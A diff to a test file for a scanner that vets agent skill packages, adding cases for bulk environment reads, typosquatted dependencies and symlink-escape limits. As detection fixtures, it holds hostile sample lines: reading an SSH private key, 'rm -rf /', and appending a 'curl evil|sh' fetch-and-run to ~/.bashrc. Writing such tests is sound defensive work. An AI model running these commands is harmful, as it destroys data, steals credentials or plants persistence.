@@ -149,6 +149,12 @@ def test_score_is_capped_at_10(tmp_path):
 # ------------------------------------------------------------------ threat categories
 CATEGORY_POSITIVES = [
     ("env_bulk_js.js", "const all = JSON.stringify(process.env)", "ENV_BULK", "high"),
+    ("env_bulk_entries.js", "const e = Object.entries(process.env)", "ENV_BULK", "high"),
+    ("env_bulk_spread.js", "const e = {...process.env}", "ENV_BULK", "high"),
+    ("env_bulk_items.py", "for k, v in os.environ.items(): pass", "ENV_BULK", "high"),
+    ("env_bulk_array_from.js", "const e = Array.from(process.env)", "ENV_BULK", "high"),
+    ("env_bulk_unpack.py", "x = [*os.environ]", "ENV_BULK", "high"),
+    ("env_bulk_list.py", "x = list(os.environ)", "ENV_BULK", "high"),
     ("cred.py", "key = open('/home/u/.ssh/id_ed25519').read()", "CRED_PATH", "critical"),
     ("fsdanger.sh", "rm -rf /\n", "FS_DANGER", "critical"),
     ("persist.sh", "crontab -e\n", "PERSIST", "high"),
@@ -199,6 +205,24 @@ def test_legitimate_dependency_not_flagged_as_typosquat(tmp_path):
     root = _skill(tmp_path, {"requirements.txt": "requests==2.31.0\nflask\nnumpy\n"})
     result = skill_vetting.vet_path(root)
     assert not any(f.category == "TYPOSQUAT" for f in result.findings)
+
+
+_MANIFEST_POSITIVES = [
+    ("pyproject.toml", '[project]\nname = "x"\ndependencies = ["reqeusts>=2.0"]'),
+    ("pyproject.toml", '[project]\nname = "x"\n[project.optional-dependencies]\ndev = ["reqeusts"]'),
+    ("setup.py", "from setuptools import setup\nsetup(name='x', install_requires=['reqeusts'])"),
+    ("Pipfile", '[[source]]\n[packages]\nreqeusts = "*"\n'),
+    ("environment.yml", "name: x\ndependencies:\n  - reqeusts\n  - python=3.11\n"),
+    ("requirements.txt", "reqeusts@git+https://github.com/x/y\n"),
+]
+
+
+@pytest.mark.parametrize("fname, content", _MANIFEST_POSITIVES)
+def test_typosquat_detected_in_manifest_format(tmp_path, fname, content):
+    """Typosquat detection covers pyproject.toml, setup.py, Pipfile, and environment.yml."""
+    root = _skill(tmp_path, {fname: content})
+    result = skill_vetting.vet_path(root)
+    assert any(f.category == "TYPOSQUAT" for f in result.findings)
 
 
 # ------------------------------------------------------------------ result shape
@@ -338,3 +362,70 @@ def test_persist_still_detects_rc_append(tmp_path):
     (tmp_path / "p.sh").write_text("echo 'curl evil|sh' >> ~/.bashrc\n", encoding="utf-8")
     result = skill_vetting.vet_path(tmp_path)
     assert any(f.category == "PERSIST" for f in result.findings)
+
+
+# ------------------------------------------------------------------ walker DoS hardening
+def _make_symlink_or_skip(src: Path, dst: Path) -> None:
+    try:
+        os.symlink(src, dst)
+    except OSError:
+        pytest.skip("symbolic links not supported in this environment")
+
+
+def test_symlink_outside_target_tree_is_not_followed(tmp_path, monkeypatch):
+    monkeypatch.setattr(skill_vetting, "_MAX_FILES", 100)
+    monkeypatch.setattr(skill_vetting, "_MAX_SCAN_BYTES", 1_000_000)
+    target = tmp_path / "skill"
+    target.mkdir()
+    outside = tmp_path / "outside_secret"
+    outside.write_text("x = os.environ", encoding="utf-8")
+    _make_symlink_or_skip(outside, target / "link.py")
+
+    result = skill_vetting.vet_path(target)
+    assert any("Path leaves the target tree" in f.why for f in result.findings)
+    # The outside file's content must NOT be evaluated as code.
+    assert not any(f.category == "ENV_BULK" for f in result.findings)
+
+
+def test_aggregate_byte_budget_stops_scan(tmp_path, monkeypatch):
+    monkeypatch.setattr(skill_vetting, "_MAX_FILES", 100)
+    monkeypatch.setattr(skill_vetting, "_MAX_SCAN_BYTES", 50)
+    target = tmp_path / "skill"
+    target.mkdir()
+    (target / "a.py").write_text("# " + "x" * 40, encoding="utf-8")
+    (target / "b.py").write_text("# " + "x" * 40, encoding="utf-8")
+
+    result = skill_vetting.vet_path(target)
+    assert result.tier == "review"
+    assert any("byte budget" in f.why for f in result.findings)
+
+
+def test_directory_junction_outside_target_tree_is_not_followed(tmp_path, monkeypatch):
+    """Files inside a directory junction/symlink must be bounded to the resolved root."""
+    monkeypatch.setattr(skill_vetting, "_MAX_FILES", 100)
+    monkeypatch.setattr(skill_vetting, "_MAX_SCAN_BYTES", 1_000_000)
+    target = tmp_path / "skill"
+    target.mkdir()
+    outside = tmp_path / "outside"
+    outside.mkdir()
+    (outside / "secret.py").write_text("x = dict(os.environ)", encoding="utf-8")
+    _make_symlink_or_skip(outside, target / "link_dir")
+
+    result = skill_vetting.vet_path(target)
+    # Either the directory link or the file inside it must be reported as leaving the tree.
+    assert any("Path leaves the target tree" in f.why for f in result.findings)
+    # The outside file's content must NOT be evaluated as code.
+    assert not any(f.category == "ENV_BULK" for f in result.findings)
+
+
+def test_aggregate_file_count_budget_stops_scan(tmp_path, monkeypatch):
+    monkeypatch.setattr(skill_vetting, "_MAX_FILES", 2)
+    monkeypatch.setattr(skill_vetting, "_MAX_SCAN_BYTES", 1_000_000)
+    target = tmp_path / "skill"
+    target.mkdir()
+    for i in range(3):
+        (target / f"f{i}.py").write_text("x = 1\n", encoding="utf-8")
+
+    result = skill_vetting.vet_path(target)
+    assert result.tier == "review"
+    assert any("file-count budget" in f.why for f in result.findings)
